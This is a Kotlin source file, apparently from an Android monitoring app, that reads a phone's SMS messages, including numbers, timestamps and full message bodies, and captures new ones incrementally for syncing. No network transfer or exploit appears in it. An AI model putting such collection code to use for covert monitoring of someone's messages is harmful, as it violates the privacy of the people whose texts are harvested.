package com.spapp.monitoring.collectors

import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.BaseColumns
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.SmsLogEntry

/**
 * Reads SMS logs (number, timestamp, body, direction) via the SMS content provider.
 * Supports incoming, outgoing (sent/queued/outbox), and handles recipient resolution
 * via thread_id when the address field is omitted by the carrier or OEM messaging app.
 */
class SmsLogCollector(private val context: Context) {

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) ==
            PackageManager.PERMISSION_GRANTED

    /**
     * [afterExternalId] == -1 means "never synced before": bootstraps with
     * the most recent [initialBatchSize] messages (by date, descending).
     * Once bootstrapped, queries strictly ascending by row ID for incremental capture.
     */
    fun collectSince(afterExternalId: Long, initialBatchSize: Int = 100): List<SmsLogEntry> {
        if (!hasPermission()) return emptyList()

        val entries = mutableListOf<SmsLogEntry>()
        val projection = arrayOf(
            BaseColumns._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE,
            Telephony.Sms.BODY,
            Telephony.Sms.THREAD_ID
        )

        val (selection, selectionArgs, sortOrder, cap) = if (afterExternalId < 0) {
            Quad(null, null, "${Telephony.Sms.DATE} DESC", initialBatchSize)
        } else {
            Quad("${BaseColumns._ID} > ?", arrayOf(afterExternalId.toString()), "${BaseColumns._ID} ASC", 500)
        }

        context.contentResolver.query(Telephony.Sms.CONTENT_URI, projection, selection, selectionArgs, sortOrder)
            ?.use { cursor ->
                val idIdx = cursor.getColumnIndex(BaseColumns._ID)
                val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = cursor.getColumnIndex(Telephony.Sms.TYPE)
                val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
                val threadIdIdx = cursor.getColumnIndex(Telephony.Sms.THREAD_ID)

                while (cursor.moveToNext() && entries.size < cap) {
                    val type = cursor.getInt(typeIdx)
                    // Skip unsent drafts
                    if (type == Telephony.Sms.MESSAGE_TYPE_DRAFT) continue

                    val externalId = cursor.getLong(idIdx)
                    val rawAddress = if (addressIdx != -1) cursor.getString(addressIdx) else null
                    val threadId = if (threadIdIdx != -1) cursor.getLong(threadIdIdx) else -1L

                    val address = if (!rawAddress.isNullOrBlank()) {
                        rawAddress
                    } else if (threadId > 0) {
                        getAddressFromThread(threadId) ?: "Unknown"
                    } else {
                        "Unknown"
                    }

                    val date = cursor.getLong(dateIdx)
                    val body = if (bodyIdx != -1) cursor.getString(bodyIdx) else null
                    // Telephony.Sms.MESSAGE_TYPE_INBOX = 1 (incoming), all other active types (sent=2, outbox=4, queued=6) are outgoing
                    val direction = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "incoming" else "outgoing"

                    entries += SmsLogEntry(
                        direction = direction,
                        counterparty = address,
                        messageAtEpochMs = date,
                        body = body,
                        externalId = externalId
                    )
                }
            }
        return entries
    }

    private fun getAddressFromThread(threadId: Long): String? {
        if (threadId <= 0) return null
        return try {
            val uri = Uri.parse("content://mms-sms/conversations?simple=true")
            context.contentResolver.query(
                uri,
                arrayOf(BaseColumns._ID, "recipient_ids"),
                "${BaseColumns._ID} = ?",
                arrayOf(threadId.toString()),
                null
            )?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndex("recipient_ids")
                    if (idx != -1) {
                        val recipientIds = c.getString(idx)
                        if (!recipientIds.isNullOrBlank()) {
                            resolveRecipientIds(recipientIds)
                        } else null
                    } else null
                } else null
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun resolveRecipientIds(recipientIds: String): String? {
        return try {
            val ids = recipientIds.split(" ").filter { it.isNotBlank() }
            val addresses = mutableListOf<String>()
            for (id in ids) {
                val uri = Uri.parse("content://mms-sms/canonical-address/$id")
                context.contentResolver.query(uri, arrayOf("address"), null, null, null)?.use { c ->
                    if (c.moveToFirst()) {
                        val addr = c.getString(0)
                        if (!addr.isNullOrBlank()) addresses += addr
                    }
                }
            }
            if (addresses.isNotEmpty()) addresses.joinToString(", ") else null
        } catch (_: Exception) {
            null
        }
    }

    private data class Quad(
        val selection: String?,
        val selectionArgs: Array<String>?,
        val sortOrder: String,
        val cap: Int
    )
}
